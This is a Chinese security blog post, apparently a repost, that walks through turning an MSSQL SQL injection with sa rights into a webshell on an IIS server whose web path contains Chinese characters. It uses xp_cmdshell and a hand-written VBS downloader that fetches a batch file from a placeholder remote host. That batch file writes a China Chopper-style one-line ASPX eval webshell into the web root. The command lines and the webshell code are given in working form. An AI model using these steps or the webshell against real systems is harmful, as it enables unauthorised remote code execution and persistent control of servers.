<!doctype html><html lang=zh><meta charset=utf-8><meta name=generator content="Hugo 0.64.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><title>MSSQL遇中文转Unicode编码无法正常写入Shell&nbsp;&ndash;&nbsp;WTFSec</title><link rel=stylesheet href=/css/core.min.c09905b8029800c3040c25da67f23499711f4327cef0f32acd9b40c44908b8cb40fd926ead46b3f6f5a6bf9be3de3108.css integrity=sha384-wJkFuAKYAMMEDCXaZ/I0mXEfQyfO8PMqzZtAxEkIuMtA/ZJurUaz9vWmv5vj3jEI><body><div class=base-body><section id=header class="site header"><div class="header wrap"><span class="header left-side"><a class="site home" href=/><span class="site name">WTFSec</span></a></span>
<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>分类</a><a class="nav item" href=/tags/>标签</a><a class="nav item" href=/link/>友链</a>
<input placeholder="Google 站内搜索" id=search_input style=width:150px>
<button onclick=search()><svg width="13" height="13" viewBox="0 0 13 13"><title>搜尋</title><path d="m4.8495 7.8226c.82666.0 1.5262-.29146 2.0985-.87438.57232-.58292.86378-1.2877.87438-2.1144.010599-.82666-.28086-1.5262-.87438-2.0985-.59352-.57232-1.293-.86378-2.0985-.87438-.8055-.010599-1.5103.28086-2.1144.87438-.60414.59352-.8956 1.293-.87438 2.0985.021197.8055.31266 1.5103.87438 2.1144.56172.60414 1.2665.8956 2.1144.87438zm4.4695.2115 3.681 3.6819-1.259 1.284-3.6817-3.7.0019784-.69479-.090043-.098846c-.87973.76087-1.92 1.1413-3.1207 1.1413-1.3553.0-2.5025-.46363-3.4417-1.3909s-1.4088-2.0686-1.4088-3.4239.4696-2.4966 1.4088-3.4239c.9392-.92727 2.0864-1.3969 3.4417-1.4088 1.3553-.011889 2.4906.45771 3.406 1.4088.9154.95107 1.379 2.0924 1.3909 3.4239.0 1.2126-.38043 2.2588-1.1413 3.1385l.098834.090049z"/></svg></button></nav></div><script>function search(){const search_value=document.getElementById("search_input").value;if(search_value!==''){window.open("/search/?q="+search_value,"_blank");}}
document.getElementById("search_input").addEventListener("keydown",function(e){if(e.key==="Enter"){search()}});</script></span></div></section><div id=content><div class=article-container><section class="article header"><h1 class="article title">MSSQL遇中文转Unicode编码无法正常写入Shell</h1><p class="article date"><span class=lang><a>Hzllaga</a> </span>Monday, July 23, 2018</p></section><article class="article markdown-body"><p><a target=_blank rel="noopener noreferrer" href=https://cdn.wtfsec.org/img/20200223164802.jpg><img src=https://cdn.wtfsec.org/img/20200223164802.jpg alt></a></p><p>前几天练手，戳到一个SQL注入，SQL权限是sa按道理来说一般到这里就终止渗透了，但是因为是内网，想继续玩还是得有个Shell。在SQLMAP中如果获取一个OS-Shell的时候需要特定的SQL注入类型，可惜并不支持。</p><p>在系统后台中发现KindEditor没有洞。系统是2008 IIS7想来想去执行xp_cmdshell应该是没有问题的，应该只是说SQLMAP的问题，也没深入去研究SQLMAP。转Pangolin处理，执行cmd倒是没问题了，但是如果是在dir列目录到Web目录的时候直接读取不到，一头雾水。。</p><p>后在Pangolin里测试的时候执行了 <code>echo 官网勿删 > c:\w.txt</code> 随后 <code>type c:\w.txt</code> 返回 <code>&amp;#23448;&amp;#32593;&amp;#21247;&amp;#21024;</code> 既然有中文路径写Shell有一定问题，那换一种姿势。</p><p>我们知道Web的路径在哪里了，剩下就是如何把Shell写到Web目录里边去，只有MSSQL执行<code>xp_cmdshell</code>的话，其实很简单的直接用下载者就可以了，那么我测试了一下远程下载文件下载失败，写入文件可以。那自己手动写一个vbs下载者就可以了。</p><p>首先注意一点，在写下载者的时候里面不能出现任何中文字符，也就是说我们不能直接下载一个Shell到Web目录中。</p><p>找web目录可以参考这里：<a href=../echo-%e4%b8%80%e5%8f%a5%e8%af%9d%e5%86%99%e5%85%a5%e8%af%bbIIS%e9%85%8d%e7%bd%aevbs%e8%84%9a%e6%9c%ac/>echo-一句话写入读IIS配置vbs脚本</a></p><p>写入下载者参考这里：<a href=../echo-%e4%b8%80%e5%8f%a5%e8%af%9d%e5%86%99%e5%85%a5vbs%e4%b8%8b%e8%bd%bd%e8%80%85/>echo一句话写入vbs下载者</a></p><p><code>远程文件</code>中的内容：</p><p><pre><code class=language-vbs data-lang=vbs>echo ^<%@ Page Language="Jscript"%^>^<%%eval(Request.Item["chopper"],"unsafe");%^> > x:\wwwroot(官网勿删)\x.aspx</code></pre>然后运行<pre><code class=language-vbs data-lang=vbs>cscript C:\get.vbs http://xxx.com/xxx.bat C:\xxx.bat</code></pre>然后再运行那个批处理，就会发现webshell已经躺在web目录里面了。</p></article><section class="article labels"><a class=category href=/categories/%E8%BD%AC%E8%BD%BD/>转载</a><a class=tag href=/tags/mssql/>MSSQL</a><a class=tag href=/tags/sql%E6%B3%A8%E5%85%A5/>SQL注入</a></section></div><div class="article navigation"><p><a class=link href=https://wtfsec.org/posts/msf-%E5%90%8C%E7%AB%AF%E5%8F%A3%E6%8E%A5%E5%8F%97%E5%A4%9A%E4%B8%AAsession/><span class=li>&larr;</span>Msf 同端口接受多个session</a><p><a class=link href=https://wtfsec.org/posts/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8metasploit%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/><span class=li>&rarr;</span>【渗透神器】Metasploit基本用法</a></p></div></div><section id=footer class=footer><div class=footer-wrap><p class=copyright>©2014-2020 WTFSec.</p><p class=powerby><span>Powered by </span><a href=https://gohugo.io target=_blank>Hugo</a><span> and the </span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p><p class=powerby><span>CDN by </span><a href=https://cf.wtfsec.org target=_blank>Cloudflare</a><span> and </span><a href="https://console.upyun.com/register/?invite=H1xhvqTVV" target=_blank>又拍云</a></p></div></section><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-83215806-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script data-ad-client=ca-pub-4220670081232153 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></div></body></html>